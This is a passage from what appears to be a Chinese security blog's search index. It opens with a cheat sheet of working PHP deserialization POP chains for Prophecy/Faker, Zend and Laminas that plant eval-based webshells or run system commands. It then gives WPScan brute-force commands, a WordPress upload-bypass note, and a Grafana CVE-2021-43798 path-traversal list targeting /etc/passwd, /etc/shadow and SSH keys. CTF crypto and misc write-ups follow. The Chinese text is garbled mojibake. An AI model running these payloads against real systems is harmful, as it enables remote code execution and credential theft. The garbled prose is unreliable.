ObjectProphecy(&#x27;1&#x27;); $this-&gt;processes[]=new ObjectProphecy($a); &#125; &#125; echo urlencode(serialize(new RunProcess()));&#125;namespace Prophecy\\Prophecy&#123; use Prophecy\\Doubler\\LazyDouble; class ObjectProphecy&#123; private $lazyDouble; private $revealer; public function __construct($a)&#123; $this-&gt;revealer=$a;//ä¸€ä¸ªè°ƒç”¨è‡ªå·±çš„å¯¹è±¡ $this-&gt;lazyDouble=new lazyDouble(); &#125; &#125; &#125;namespace Prophecy\\Doubler&#123; use Prophecy\\Doubler\\Doubler; class LazyDouble&#123; private $doubler; private $class; private $interfaces; private $arguments; private $double=null; public function __construct()&#123; $this-&gt;doubler = new Doubler(); $this-&gt;arguments=array(&#x27;x&#x27;=&gt;&#x27;x&#x27;); $this-&gt;class=new \\ReflectionClass(&#x27;Exception&#x27;); $this-&gt;interfaces[]=new \\ReflectionClass(&#x27;Exception&#x27;); &#125; &#125;&#125;namespace Faker&#123; class DefaultGenerator&#123; protected $default; public function __construct($default)&#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Prophecy\\Doubler\\Generator\\Node&#123; class ClassNode&#123;&#125;&#125;namespace Prophecy\\Doubler&#123; use Faker\\DefaultGenerator; use Prophecy\\Doubler\\Generator\\ClassCreator; use Prophecy\\Doubler\\Generator\\Node\\ClassNode; class Doubler&#123; private $namer; private $mirror; private $patches; private $creator; public function __construct()&#123; $name=&#x27;x&#x27;; $node=new ClassNode(); $this-&gt;namer=new DefaultGenerator($name); $this-&gt;mirror=new DefaultGenerator($node); $this-&gt;patches=array(new DefaultGenerator(false)); $this-&gt;creator=new ClassCreator(); &#125; &#125;&#125;namespace Prophecy\\Doubler\\Generator&#123; use Faker\\DefaultGenerator; class ClassCreator&#123; private $generator; public function __construct()&#123; $this-&gt;generator=new DefaultGenerator(&#x27;eval($_POST[&quot;cmd&quot;]);&#x27;); &#125; &#125;&#125; b. 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace Codeception\\Extension&#123; use Faker\\UniqueGenerator; class RunProcess&#123; private $processes = []; public function __construct()&#123; $this-&gt;processes[]=new UniqueGenerator(); &#125; &#125; echo urlencode(serialize(new RunProcess()));&#125;namespace Faker&#123; use Symfony\\Component\\String\\LazyString; class UniqueGenerator&#123; protected $generator; protected $maxRetries; public function __construct()&#123; $a = new LazyString(); $this-&gt;generator = new DefaultGenerator($a); $this-&gt;maxRetries = 2; &#125; &#125; class DefaultGenerator&#123; protected $default; public function __construct($default = null)&#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Symfony\\Component\\String&#123; class LazyString&#123; private $value; public function __construct()&#123; include(&quot;closure/autoload.php&quot;); $a = function()&#123;phpinfo();&#125;; $a = \\Opis\\Closure\\serialize($a); $b = unserialize($a); $this-&gt;value=$b; &#125; &#125;&#125; â€‹ Joomla! 3.x &lt;3.4.6 ååºåˆ—åŒ–ï¼ˆ+1.5.x/2.xï¼‰ joomla_exp â€‹ Wordpress æ‰«æå™¨ WPScan æ‰«æç«™ç‚¹ï¼šwpscan --url http://xxxx æ‰«æä¸»é¢˜ï¼šwpscan --url http://xxxx --enumerate t æ‰«æä¸»é¢˜å­˜åœ¨æ¼æ´ï¼šwpscan --url http://xxxx --enumerate vt æ‰«æå®‰è£…æ’ä»¶ï¼šwpscan --url http://xxxx --enumerate p æ‰«æå®‰è£…æ’ä»¶æ¼æ´ï¼šwpscan --url http://xxxx --enumerate vp æšä¸¾ç”¨æˆ·ï¼šwpscan --url http://xxxx --enumerate u æš´åŠ›ç ´è§£ï¼š wpscan --url http://xxxx --wordlist å¯†ç å­—å…¸ --username ç”¨æˆ·åæˆ–è€…å¯†ç å­—å…¸ wpscan --url xxxx -P /root/Desktop/top10000.txt -U admin æ’ä»¶ sp-client-document-manager CVE-2021-24347 Getshell ç›´æ¥ä¸Šä¼ ï¼Œåç¼€åå¤§å°å†™ç»•è¿‡ï¼Œä¸Šä¼ åè·¯å¾„ä¸ºwp-content/uploads/sp-client-document-manager/[user_id]/[file_name]ï¼Œadminçš„useridä¸º1 moodle https://github.com/HoangKien1020/Moodle_RCE User Meta CVE-2022-0779 simple-link-directory CVE-2022-0760 https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210 â€‹ ZendZend FrameWork Pop Chain zend framework 1 ååºåˆ—åŒ– 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?phpclass Zend_Mail&#123;&#125;class Zend_Log&#123; protected $_writers; function __construct() &#123; $this-&gt;_writers = [new Zend_Log_Writer_Mail()]; &#125;&#125;class Zend_Log_Writer_Mail&#123; protected $_eventsToMail; protected $_mail; protected $_layoutEventsToMail; protected $_layout; function __construct() &#123; $this-&gt;_mail = new Zend_Mail(); $this-&gt;_eventsToMail = [1]; $this-&gt;_layoutEventsToMail = &quot;&quot;; $this-&gt;_layout = new Zend_Config_Writer_Yaml(); &#125;&#125;class Zend_CodeGenerator_Php_File&#123; protected $_filename; protected $_body; function __construct() &#123; $this-&gt;_filename = &quot;a.php&quot;; $this-&gt;_body = &#x27;@eval(base64_decode($_POST[1]));&#x27;; &#125;&#125;class Zend_Config&#123; protected $_data; protected $_loadedSection; protected $_extends; function __construct() &#123; $this-&gt;_loadedSection = &quot;Mrkaixin&quot;; $this-&gt;_data = []; $this-&gt;_extends = &quot;Mrkaixin&quot;; &#125;&#125;class Zend_Config_Writer_Yaml&#123; protected $events; protected $_config; protected $_yamlEncoder; function __construct() &#123; $this-&gt;events = &quot;Mrkaixin&quot;; $this-&gt;_config = new Zend_Config(); $this-&gt;_yamlEncoder = [new Zend_CodeGenerator_Php_File(), &#x27;write&#x27;]; &#125;&#125;echo base64_encode(serialize(new Zend_Log())); â€‹ LaminasZend FrameWork Pop Chain å…¥å£ action: http://your-ip/public/index.php/application[/:action] zend framework 4 ååºåˆ—åŒ–+RCE a. 123456789101112131415161718192021222324252627282930313233343536&lt;?phpnamespace Zend\\View\\Renderer;use Zend\\Config\\Config;class PhpRenderer&#123; function __construct() &#123; $this-&gt;__helpers = new Config(); &#125;&#125;namespace Zend\\Config;class Config &#123; protected $data = []; function __construct() &#123; $this-&gt;data = [&#x27;shutdown&#x27;=&gt;&quot;phpinfo&quot;]; &#125;&#125;namespace Zend\\Log;use Zend\\View\\Renderer\\PhpRenderer;class Logger&#123; protected $writers; function __construct() &#123; $this-&gt;writers = [new PhpRenderer()]; &#125;&#125;echo base64_encode(serialize(new Logger())); b. 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace Laminas\\View\\Resolver&#123; class TemplateMapResolver&#123; protected $map = [&quot;setBody&quot;=&gt;&quot;system&quot;]; &#125;&#125;namespace Laminas\\View\\Renderer&#123; class PhpRenderer&#123; private $__helpers; function __construct()&#123; $this-&gt;__helpers = new \\Laminas\\View\\Resolver\\TemplateMapResolver(); &#125; &#125;&#125;namespace Laminas\\Log\\Writer&#123; abstract class AbstractWriter&#123;&#125; class Mail extends AbstractWriter&#123; protected $eventsToMail = [&quot;ls&quot;]; protected $subjectPrependText = null; protected $mail; function __construct()&#123; $this-&gt;mail = new \\Laminas\\View\\Renderer\\PhpRenderer(); &#125; &#125;&#125;namespace Laminas\\Log&#123; class Logger&#123; protected $writers; function __construct()&#123; $this-&gt;writers = [new \\Laminas\\Log\\Writer\\Mail()]; &#125; &#125;&#125;namespace&#123;$a = new \\Laminas\\Log\\Logger();echo base64_encode(serialize($a));&#125; â€‹ Grafana é‡è¦æ–‡ä»¶ 12345678910111213141516171819/usr/sbin/grafana-server/etc/init.d/grafana-server/etc/default/grafana-server/etc/grafana/grafana.ini/var/log/grafana/grafana.log/var/lib/grafana/grafana.db/usr/share/grafana/conf/defaults.ini/etc/passwd/etc/shadow/home/grafana/.bash_history/home/grafana/.ssh/id_rsa/root/.bash_history/root/.ssh/id_rsa/usr/local/etc/grafana/grafana.ini/proc/net/fib_trie/proc/net/tcp/proc/self/cmdline 2.6.0 ä»»æ„æ–‡ä»¶è¯»å– CVE-2021-43798 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/public/plugins/alertGroups/../../../../../../../../etc/passwd/public/plugins/alertlist/../../../../../../../../etc/passwd/public/plugins/alertmanager/../../../../../../../../etc/passwd/public/plugins/annolist/../../../../../../../../etc/passwd/public/plugins/barchart/../../../../../../../../etc/passwd/public/plugins/bargauge/../../../../../../../../etc/passwd/public/plugins/canvas/../../../../../../../../etc/passwd/public/plugins/cloudwatch/../../../../../../../../etc/passwd/public/plugins/dashboard/../../../../../../../../etc/passwd/public/plugins/dashlist/../../../../../../../../etc/passwd/public/plugins/debug/../../../../../../../../etc/passwd/public/plugins/elasticsearch/../../../../../../../../etc/passwd/public/plugins/gauge/../../../../../../../../etc/passwd/public/plugins/geomap/../../../../../../../../etc/passwd/public/plugins/gettingstarted/../../../../../../../../etc/passwd/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd/public/plugins/grafana/../../../../../../../../etc/passwd/public/plugins/graph/../../../../../../../../etc/passwd/public/plugins/graphite/../../../../../../../../etc/passwd/public/plugins/heatmap/../../../../../../../../etc/passwd/public/plugins/histogram/../../../../../../../../etc/passwd/public/plugins/influxdb/../../../../../../../../etc/passwd/public/plugins/jaeger/../../../../../../../../etc/passwd/public/plugins/live/../../../../../../../../etc/passwd/public/plugins/logs/../../../../../../../../etc/passwd/public/plugins/loki/../../../../../../../../etc/passwd/public/plugins/mixed/../../../../../../../../etc/passwd/public/plugins/mssql/../../../../../../../../etc/passwd/public/plugins/mysql/../../../../../../../../etc/passwd/public/plugins/news/../../../../../../../../etc/passwd/public/plugins/nodeGraph/../../../../../../../../etc/passwd/public/plugins/opentsdb/../../../../../../../../etc/passwd/public/plugins/piechart/../../../../../../../../etc/passwd/public/plugins/pluginlist/../../../../../../../../etc/passwd/public/plugins/postgres/../../../../../../../../etc/passwd/public/plugins/prometheus/../../../../../../../../etc/passwd/public/plugins/stat/../../../../../../../../etc/passwd/public/plugins/state-timeline/../../../../../../../../etc/passwd/public/plugins/status-history/../../../../../../../../etc/passwd/public/plugins/table-old/../../../../../../../../etc/passwd/public/plugins/table/../../../../../../../../etc/passwd/public/plugins/tempo/../../../../../../../../etc/passwd/public/plugins/testdata/../../../../../../../../etc/passwd/public/plugins/text/../../../../../../../../etc/passwd/public/plugins/timeseries/../../../../../../../../etc/passwd/public/plugins/welcome/../../../../../../../../etc/passwd/public/plugins/xychart/../../../../../../../../etc/passwd/public/plugins/zipkin/../../../../../../../../etc/passwd","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://lazzzaro.github.io/tags/PHP/"},{"name":"CMS","slug":"CMS","permalink":"https://lazzzaro.github.io/tags/CMS/"}],"author":"Lazzaro"},{"title":"GKCTF 2020","slug":"match-GKCTF-2020","date":"2020-05-24T10:03:26.000Z","updated":"2020-06-26T10:47:04.329Z","comments":true,"path":"2020/05/24/match-GKCTF-2020/","permalink":"https://lazzzaro.github.io/2020/05/24/match-GKCTF-2020/","excerpt":"","text":"CRYPTOå°å­¦ç”Ÿçš„å¯†ç å­¦ e(x)=11x+6(mod26) å¯†æ–‡ï¼šwelcylk ï¼ˆflagä¸ºbase64å½¢å¼ï¼‰ ä»¿å°„å¯†ç ï¼Œè§£å¯†å…¬å¼ï¼š$m=11^{-1}(e(x)-6)\\pmod {26}$ 12345678910111213import gmpy2import base64def affline_decode(cipher_text, a, b, m): plain_text = &#x27;&#x27; for i in cipher_text: if i in &#x27;abcdefghijklmnopqrstuvwxyz&#x27;: plain_text += chr(((ord(i)-ord(&#x27;a&#x27;))-b)*gmpy2.invert(a,m) % m + ord(&#x27;a&#x27;)) else: plain_text += i print(plain_text) m = affline_decode(&#x27;welcylk&#x27;, 11, 6, 26)flag = base64.b64encode(m) â€‹ babycrypto é™„ä»¶ï¼šencode.txt å·²çŸ¥ï¼šnï¼Œeï¼Œencï¼Œpé«˜ä½ï¼ˆ1024-128ï¼‰ RSAä¸­çš„coppersmithæ”»å‡»ï¼ˆå·²çŸ¥pçš„é«˜ä½æ”»å‡»ï¼‰ Sageè„šæœ¬æ±‚pï¼Œqï¼š 12345678910111213141516171819#Sagefrom sage.all import *n = 0xb119849bc4523e49c6c038a509a74cda628d4ca0e4d0f28e677d57f3c3c7d0d876ef07d7581fe05a060546fedd7d061d3bc70d679b6c5dd9bc66c5bdad8f2ef898b1e785496c4989daf716a1c89d5c174da494eee7061bcb6d52cafa337fc2a7bba42c918bbd3104dff62ecc9d3704a455a6ce282de0d8129e26c840734ffd302bec5f0a66e0e6d00b5c50fa57c546cff9d7e6a978db77997082b4cb927df9847dfffef55138cb946c62c9f09b968033745b5b6868338c64819a8e92a827265f9abd409359a9471d8c3a2631b80e5b462ba42336717700998ff38536c2436e24ac19228cd2d7a909ead1a8494ff6c3a7151e888e115b68cc6a7a8c6cf8a6c005Lp4 = 0xe4e4b390c1d201dae2c00a4669c0865cc5767bc444f5d310f3cfc75872d96feb89e556972c99ae20753e3314240a52df5dccd076a47c6b5d11b531b92d901b2b512aeb0b263bbfd624fe3d52e5e238beeb581ebe012b2f176a4ffd1e0d2aa8c4d3a2656573b727d4d3136513a931428b#på»0çš„å‰©ä½™ä½e = 65537pbits = 1024kbits = pbits - p4.nbits()print(p4.nbits())p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4roots = f.small_roots(X=2^kbits, beta=0.4)#ç»è¿‡ä»¥ä¸Šä¸€äº›å‡½æ•°å¤„ç†åï¼Œnå’Œpå·²ç»è¢«è½¬åŒ–ä¸º10è¿›åˆ¶if roots: p = p4+int(roots[0]) print(&quot;n: &quot;+str(n)) print(&quot;p: &quot;+str(p)) print(&quot;q: &quot;+str(n//p)) å†ç»“åˆencæ­£å¸¸è§£å‡ºæ˜æ–‡må³å¯ã€‚ Backdoor p=k*M+(65537**a %M) å·²çŸ¥ï¼šRSAæ­£å¸¸åŠ å¯†è„šæœ¬ï¼Œå…¬é’¥æ–‡ä»¶pub.pemï¼Œbase64åŠ å¯†å¯†æ–‡æ–‡ä»¶flag.enc å…¬é’¥æ–‡ä»¶è§£æå¾—nï¼Œeï¼Œå¯†æ–‡æ–‡ä»¶base64è§£ç å¤„ç†å¾—c ä» $p=kM+(65537^a \\% M)$ å…¥æ‰‹ï¼ŒæŸ¥è¯¢äº†è§£åˆ°æ­¤å¼å­ä¸ºå¼±ç´ æ•°ç”Ÿæˆå…¬å¼ å¼±ç´ æ•°ç”Ÿæˆå…¬å¼å‚è€ƒï¼š https://asecuritysite.com/encryption/copper https://medium.com/asecuritysite-when-bob-met-alice/so-what-was-the-problem-with-the-estonian-id-system-and-tpms-1ef02a9bde7f å¼º/å¼±ç´ æ•°å®šä¹‰ï¼šhttps://zh.wikipedia.org/wiki/%E5%BC%BA%E7%B4%A0%E6%95%B0 nçš„ç´ æ•°å› å­pæ˜¯ç”±æ­¤å…¬å¼ç”Ÿæˆçš„ï¼Œç”Ÿæˆè„šæœ¬åœ¨å‚è€ƒæ–‡ç« ä¸­å·²çŸ¥ï¼š 1234567891011121314151617181920212223242526from Crypto.Util import numberk=3vals=39a=12M=1primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997, 1009, 1013, 1019, 1021, 1031, 1033, 1039, 1049, 1051, 1061, 1063, 1069, 1087, 1091, 1093, 1097, 1103, 1109, 1117, 1123, 1129, 1151, 1153, 1163, 1171, 1181, 1187, 1193, 1201, 1213, 1217, 1223, 1229, 1231, 1237, 1249, 1259, 1277, 1279, 1283, 1289, 1291, 1297, 1301, 1303, 1307, 1319, 1321, 1327, 1361, 1367, 1373, 1381, 1399, 1409, 1423, 1427, 1429, 1433, 1439, 1447, 1451, 1453, 1459, 1471, 1481, 1483, 1487, 1489, 1493, 1499, 1511, 1523, 1531, 1543, 1549, 1553, 1559, 1567, 1571, 1579, 1583, 1597, 1601, 1607, 1609, 1613, 1619, 1621, 1627, 1637, 1657, 1663, 1667, 1669, 1693, 1697, 1699, 1709, 1721, 1723, 1733, 1741, 1747, 1753, 1759, 1777, 1783, 1787, 1789, 1801, 1811, 1823, 1831, 1847, 1861, 1867, 1871, 1873, 1877, 1879, 1889, 1901, 1907, 1913, 1931, 1933, 1949, 1951, 1973, 1979, 1987, 1993, 1997, 1999, 2003, 2011, 2017, 2027, 2029, 2039, 2053, 2063, 2069, 2081, 2083, 2087, 2089, 2099, 2111, 2113, 2129, 2131, 2137, 2141, 2143, 2153, 2161, 2179, 2203, 2207, 2213, 2221, 2237, 2239, 2243, 2251, 2267, 2269, 2273, 2281, 2287, 2293, 2297, 2309, 2311, 2333, 2339, 2341, 2347, 2351, 2357, 2371, 2377, 2381, 2383, 2389, 2393, 2399, 2411, 2417, 2423, 2437, 2441, 2447, 2459, 2467, 2473, 2477, 2503, 2521, 2531, 2539, 2543, 2549, 2551, 2557, 2579, 2591, 2593, 2609, 2617, 2621, 2633, 2647, 2657, 2659, 2663, 2671, 2677, 2683, 2687, 2689, 2693, 2699, 2707, 2711, 2713, 2719, 2729, 2731, 2741, 2749, 2753, 2767, 2777, 2789, 2791, 2797, 2801, 2803, 2819, 2833, 2837, 2843, 2851, 2857, 2861, 2879, 2887, 2897, 2903, 2909, 2917, 2927, 2939, 2953, 2957, 2963, 2969, 2971, 2999]for x in range(0, vals): M=M*primes[x]p=k*M+(65537**a %M)print(&#x27;k=&#x27;,k)print(&#x27;a=&#x27;,a)print(&#x27;Number of prime numbers used=&#x27;,vals)print(&#x27;======&#x27;)print(&#x27;M=&#x27;,M)print(&#x27;\\nPrime=&#x27;,p)isp = number.isPrime(p)if (isp==1): print(&#x27;Value is prime&#x27;)else: print(&#x27;Value is not prime&#x27;) $M$ ä»£è¡¨å‰ $x$ é¡¹ç´ æ•°çš„ä¹˜ç§¯ï¼Œ $x$ çš„å¯é€‰å€¼æœ‰5ï¼Œ16ï¼Œ39ï¼Œ71ï¼Œ80ï¼Œ126ã€‚åœ¨å‚æ•° $k$ ä¸ $a$ å–å€¼ä¸å¤§çš„æƒ…å†µä¸‹ï¼Œé€‰å–ä¸åŒçš„ $x$ å€¼ï¼Œå¾—åˆ°çš„ $p$ çš„ä½æ•°ä¸åŒã€‚ æ ¹æ®å·²çŸ¥çš„nä¸º134ä½ï¼Œé¢„ä¼°pçš„ä½æ•°ä¸è¶…è¿‡134/2=67ä½ï¼Œå¯ç¡®å®š $x$ å€¼å–39ï¼Œå³ $M=962947420735983927056946215901134429196419130606213075415963491270$ å‚è€ƒå¾—åˆ°çš„ $p$ ç¬¦åˆä½æ•°è¦æ±‚ã€‚ è¦å¾—åˆ°æ­£ç¡®çš„på€¼ï¼Œå°è¯•çˆ†ç ´ $k$ ä¸ $a$ ï¼š 1234567891011121314151617import gmpy2M=962947420735983927056946215901134429196419130606213075415963491270n=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739for k in range(100): for a in range(100): p=k*M+(65537**a %M) if n%p==0: print(&#x27;k=&#x27;,k) print(&#x27;a=&#x27;,a) print(&#x27;\\nPrime=&#x27;,p) isp = gmpy2.is_prime(p) if isp: print(&#x27;Value is prime&#x27;) else: print(&#x27;Value is not prime&#x27;) print(&#x27;======&#x27;) ç»“æœï¼š æ˜“çŸ¥ä¸¤ä¸ªç»“æœåˆ†åˆ«ä¸ºæ­£ç¡®çš„pï¼Œqå€¼~ å†ç»“åˆå¯†æ–‡cæ­£å¸¸è§£å‡ºæ˜æ–‡må³å¯ã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"DASCTF May Ã— BJDCTF 3rd å®‰æ’äº”æœˆèµ›","slug":"match-DASCTF-May-Ã—-BJDCTF-3rd-å®‰æ’äº”æœˆèµ›","date":"2020-05-23T17:13:24.000Z","updated":"2020-06-07T17:45:03.702Z","comments":true,"path":"2020/05/24/match-DASCTF-May-Ã—-BJDCTF-3rd-å®‰æ’äº”æœˆèµ›/","permalink":"https://lazzzaro.github.io/2020/05/24/match-DASCTF-May-%C3%97-BJDCTF-3rd-%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9B/","excerpt":"","text":"MISCQuestionaire å®~ æ‚¨æœ‰ä¸€ä»½è°ƒæŸ¥é—®å·~ è¯·æŸ¥æ”¶~ https://forms.gle/Vmzt99LazrtXsRLM9 è°·æ­Œé—®å·è°ƒæŸ¥ï¼ŒFQæ‰“å¼€ï¼ŒåŒ—äº¬çŸ¥è¯†ï¼Œæ¯å›ç­”å¯¹ä¸€ä¸ªç©ºå¾—flagç‰‡æ®µã€‚ ç›´æ¥F12çœ‹æºç å¤§æ³•ï¼Œæœ‰ç­”æ¡ˆï¼Œæœ‰ç»“æœï¼Œæ‹¼æ¥å¾—flagã€‚ /bin/cat 2 [CAUTION] cats as numerous as stars are comingâ€¦ è§£å‡ºçš„ç­”æ¡ˆç»md5åæäº¤~ è¿œçœ‹å¯ç°ä¸€å¼ äºŒç»´ç ï¼Œæ²¡ç”¨è„šæœ¬ï¼Œç›´æ¥stegesolve.jarï¼Œå–Red planeå¾—æ˜æ˜¾çš„é»‘ç™½å›¾ç‰‡ï¼Œä¸Šæ‰«ç å·¥å…·å¾—flagã€‚ testyournc Test your nc hint1: /f1a9.bak ä½ çœ‹åˆ°äº†å˜›? hint2: ç”¨dfå‘½ä»¤çœ‹çœ‹ç¡¬ç›˜æ€»å…±å¤šå¤§ï¼Œå†çœ‹çœ‹flagå¤šå¤§ã€‚ ncäº¤äº’é¢˜ã€‚ lså‘ç°ç›®å½•ä¸‹æœ‰flagå’Œreadmeï¼Œcat flagå‘ç°æ‰“å¼€å¡æ­»ï¼Œls -alæŸ¥çœ‹å‘ç°flagæ–‡ä»¶å¾ˆå¤§ï¼ˆ15T+ï¼‰ã€‚ åœ¨æ ¹ç›®å½•æ‰¾åˆ°å¯è¯»æ–‡ä»¶f1a9.bakï¼Œæ˜¯ç”Ÿæˆflagæ–‡ä»¶çš„æºç ï¼š å‘ç°æ˜¯æ¯ä¸ªå­—ç¬¦éƒ½éšæœºåç§» $1024\\times1024\\times1024\\times k\\quad (\\rm offset\\mit \\leq k\\leq \\rm offset+2048 )$ åå†™å…¥ï¼Œ$\\rm offset$ æœ¬èº«ä¹Ÿåœ¨ä¸æ–­é€’å¢ï¼Œä¸­é—´å¡«æ»¡ç©ºå­—ç¬¦ï¼Œæ— æ³•æŒ‰å›ºå®šä½ç½®è¯»å–ã€‚ è¯•è¿‡å¾ˆå¤šshellå‘½ä»¤çš„ç»“åˆï¼Œcat,tr,sed,grep,hexdumpéƒ½å„ç§èŠ±æ ·å¡æ­»â€¦ å—å¤§ä½¬æç¤ºæ­¤ç±»æ–‡ä»¶æ˜¯ç¨€ç–æ–‡ä»¶ï¼Œéç©ºæ•°æ®å—å­˜å…¥ç£ç›˜ï¼Œç©ºæ•°æ®åº“ä¸å ç”¨ç£ç›˜ç©ºé—´ã€‚ å°è¯•å°†æ–‡ä»¶ç§»åˆ°æœ¬åœ°å¤„ç†ï¼Œä½¿ç”¨tarå‘½ä»¤å°†flagæ–‡ä»¶æ‰“åŒ…åˆ°æŸä¸ªå¯å†™ä½ç½®ï¼Œæ¯”å¦‚/var/tmpï¼Œæ³¨æ„åˆ°taræœ‰ä¸ªå‚æ•°å¯é«˜æ•ˆå¤„ç†ç¨€ç–æ–‡ä»¶ï¼š -Sæˆ–â€”sparse å€˜è‹¥ä¸€ä¸ªæ–‡ä»¶å†…å«å¤§é‡çš„è¿ç»­0å­—èŠ‚ï¼Œåˆ™å°†æ­¤æ–‡ä»¶å­˜æˆç¨€ç–æ–‡ä»¶ã€‚ ä¸Šå‘½ä»¤ï¼štar -zcvfS /var/tmp/flag.tar.gz flag è¿™æ—¶æŸ¥çœ‹flag.tar.gzæ–‡ä»¶å¤§å°å°±å¾ˆå°äº†ï¼ˆ0.3KB+ï¼‰ åœ¨ncç¯å¢ƒè¿è¡Œ cat flag.tar.gz | base64 å†åœ¨æœ¬åœ°è¿è¡Œ echo -n &quot;H4sIAAAAAAAAA+3RTUrDQBgG4AgK/oBnqDfImCbpUty78gRptQURAlpXIvQIXkDEK3gBPZJHMK2iRasbGWfzPBBm5pu/N8n4vJlkkeWdqp8v2s68DXX5Pg7zJ2ShqKpQ1aHO6yzf75YXWe84drC5q8tpc9HrZRdtO/1t3Wg6jhMg//TeD4t++KE+W+xae5h97F2urz8dfKmvvU3sHnXt1rfb3yY37rKVp20+rr5l+/B5ZX3ncvU5i8s/37T738uhlr8A/+vl/naWOgMAAAAQ1/i8mVynDgEAAABEVVb9qqiLInUOAAAAIJ5BHU5TZwAAAADi6udFkzoDAAAAENegnzoBAAAAENvJMHUCAAAAILaiLJrRKB8My3L/JnUYAAAAIIpJ2570ztrhXuogAAAAAAAAwJ+9AsKEhXoAoAAA&quot; | base64 -d æŠŠå¾—åˆ°çš„base64å­—ç¬¦ä¸²å­˜å‚¨åˆ°æœ¬åœ°ã€‚ æœ¬åœ°è§£å‹å‡ºåŸå§‹flagæ–‡ä»¶ï¼ˆ15T+ï¼‰ï¼š tar -zxvfS flag.tar.gz å†ä½¿ç”¨ tar -cvfS flag-new flag å¾—åˆ°ç¨€ç–å¤„ç†è¿‡çš„flagç¨€ç–æ–‡ä»¶ã€‚ PSï¼šå†™åˆ°æœ€åå‘ç°ï¼Œä¸ç”¨åœ¨æœ¬åœ°å¤„ç†ï¼Œç›´æ¥ tar -cvfS /var/tmp/flag.tar.gz flag åº”è¯¥ä¹Ÿæˆã€‚ CRYPTObbcrypto its so simple ç»™å®šè„šæœ¬ï¼š 12345678910111213141516171819202122232425# -*- coding:utf-8 -*-import A,SALTfrom itertools import *def encrypt(m, a, si): c=&quot;&quot; for i in range(len(m)): c+=hex(((ord(m[i])) * a + ord(next(si))) % 128)[2:].zfill(2) return c if __name__ == &quot;__main__&quot;: m = &#x27;flag&#123;********************************&#125;&#x27; a = A salt = SALT assert(len(salt)==3) assert(salt.isalpha()) si = cycle(salt.lower()) print(&quot;æ˜æ–‡å†…å®¹ä¸ºï¼š&quot;) print(m) print(&quot;åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š&quot;) c=encrypt(m, a, si) print(c)#åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š#177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d salté•¿åº¦ä¸º3ï¼ŒåˆçŸ¥æ˜æ–‡mçš„å‰5ä½å’Œå1ä½å­—ç¬¦ï¼Œæœ‰å¯¹åº”å…³ç³»ï¼š (&#39;f&#39;*a+salt[0])%128 = 0x17 (&#39;l&#39;*a+salt[1])%128 = 0x74 (&#39;a&#39;*a+salt[2])%128 = 0x01 (&#39;g&#39;*a+salt[0])%128 = 0x50 (&#39;&#123;&#39;*a+salt[1])%128 = 0x4b (&#39;&#125;&#39;*a+salt[1])%128 = 0x3d å¯ç”¨è„šæœ¬çˆ†ç ´ï¼š 12345678910111213141516import stringlower = string.printable[10:36]for a in range(1001): for s0 in lower: if hex((102*a+ord(s0)) % 128) == &#x27;0x17&#x27; and hex((103*a+ord(s0)) % 128) == &#x27;0x50&#x27;: print(a, s0)for a in range(1001): for s1 in lower: if hex((108*a+ord(s1)) % 128) == &#x27;0x74&#x27; and hex((123*a+ord(s1)) % 128) == &#x27;0x4b&#x27; and hex((125*a+ord(s1)) % 128) == &#x27;0x3d&#x27;: print(a, s1)for a in range(1001): for s2 in lower: if hex((97*a+ord(s2)) % 128) == &#x27;0x1&#x27;: print(a, s2) å®¹æ˜“å¾—åˆ°ç¬¦åˆæ¡ä»¶çš„æœ€å°a=57åŠå¯¹åº”salt=&#39;ahh&#39; åœ¨ç”¨è„šæœ¬é€†å‘æ±‚å‡ºflag{}ä¸­é—´å­—ç¬¦ï¼š 1234567891011121314151617a = 57si0 = 97si1 = 104si2 = 104c = [0x17, 0x74, 0x01, 0x50, 0x4b, 0x01, 0x25, 0x27, 0x2c, 0x12, 0x27, 0x43, 0x17, 0x1e, 0x2c, 0x25, 0x0a, 0x60, 0x2e, 0x3a, 0x7c, 0x20, 0x6e, 0x01, 0x4a, 0x01, 0x27, 0x03, 0x27, 0x3a, 0x3c, 0x01, 0x60, 0x17, 0x3a, 0x73, 0x75, 0x3d]flag=&#x27;&#x27;for i in range(len(c)): if i%3 ==0: for m in range(0,127): if (m*57+si0)%128 == c[i]: flag+=chr(m) else: for m in range(0,127): if (m*57+si1)%128 == c[i]: flag+=chr(m)print(flag) å¾—åˆ°flag~ 